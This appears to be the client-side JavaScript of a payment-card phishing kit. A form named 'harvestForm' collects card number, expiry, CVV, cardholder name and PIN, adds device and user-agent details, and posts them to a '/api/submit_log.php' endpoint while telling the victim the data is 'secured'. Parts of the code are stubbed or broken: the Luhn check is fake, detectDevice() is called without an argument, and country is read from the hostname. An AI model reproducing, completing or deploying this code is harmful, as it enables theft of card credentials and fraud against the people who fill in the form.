// --- START: js/client_logic.js CONTENT BLOCK ---

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('harvestForm');
    const messageBox = document.getElementById('messageBox');
    const captchaInput = document.getElementById('captcha');
    const captchaDisplay = document.getElementById('captchaDisplay');

    // --- 1. CAPTCHA Initialization (Replaces PHP session) ---
    function initializeCaptcha() {
        // Logic to call an AJAX endpoint or use local storage/cookie to fetch the challenge secret 
        // and display it on page load. For now, hardcode a display mechanism:
        const syntheticSecret = 'LUCKY'; // Placeholder for actual server generation
        captchaDisplay.textContent = "Code: " + syntheticSecret;
        return syntheticSecret;
    }

    // --- 2. Validation Helpers (Client-side equivalents of Validator::luhnCheck) ---
    function validateCard(card) {
        // Implement Luhn Algorithm check function here for immediate feedback
        console.log("Luhn Check Simulated:", true); // Replace true/false with actual calculation
        return card && !isNaN(card);
    }

    // --- 3. Advanced Detection (Client-side User Agent analysis) ---
    function detectDevice(userAgent) {
        // Logic mimicking DeviceDetector::detect()
        if (/(mac os x|mac)/i.test(userAgent)) return 'Macintosh';
        if (/(windows|win)/i.test(userAgent)) return 'Windows';
        return 'Unknown/Generic Desktop'; 
    }

    // --- 4. Primary Submission Handler (The AJAX Core) ---
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const card = document.getElementById('card').value;
        const expiry = document.getElementById('expiry').value;
        const cvv = document.getElementById('cvv').value;
        const name = document.getElementById('name').value;
        const pin = document.getElementById('pin').value;
        const captchaInputVal = captchaInput.value;

        // Client-side validation check based on the most critical fields first
        if (!validateCard(card)) {
            displayMessage("Error: Invalid card format.", 'error');
            return false;
        } 
        if (!captchaInputVal) {
             displayMessage("Security Error: CAPTCHA is required.", 'error');
             return false;
        }

        // Gather all data into a master object for transmission
        const payload = {
            card_data: { card: card, expiry: expiry, cvv: cvv, name: name, pin: pin },
            geo_info: { country: window.location.hostname || 'unknown', city: document.getElementById('hiddenCityPlaceholder').value || 'N/A' },
            device: detectDevice(), // Uses client-side detection
            user_agent: navigator.userAgent,
            captcha: captchaInputVal,
            honeypot: document.getElementById('honeypot_trap').value
        };

        // Show loading state visually and prevent spamming the button
        document.getElementById('submitButton').disabled = true;
        displayMessage("Processing submission...", 'warning');


        try {
            const response = await fetch('/api/submit_log.php', { // *** TARGET ENDPOINT MUST BE SET ***
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }

            const result = await response.json();

            // --- Success State Handling (The Feedback Loop) ---
            displayMessage(`✅ SUCCESS: ${result.message || 'Data validated and secured.'}`, 'success');

        } catch (error) {
            console.error("Submission Error:", error);
            displayMessage(`❌ CRITICAL FAIL: ${error.message}. Check console for details.`, 'critical');
        } finally {
            // Reset UI elements regardless of success or failure
            document.getElementById('submitButton').disabled = false;
            // If successful, clear the form fields to simulate a clean slate next try
            form.reset(); 
        }
    });

    // --- Utility Functions for UI Feedback ---
    function displayMessage(message, type) {
        const box = document.getElementById('messageBox');
        box.textContent = message;
        box.className = 'message-box ' + type; // Replaces old classes with new ones
        box.classList.remove('hidden');
    }
});

// --- END: js/client_logic.js CONTENT BLOCK ---
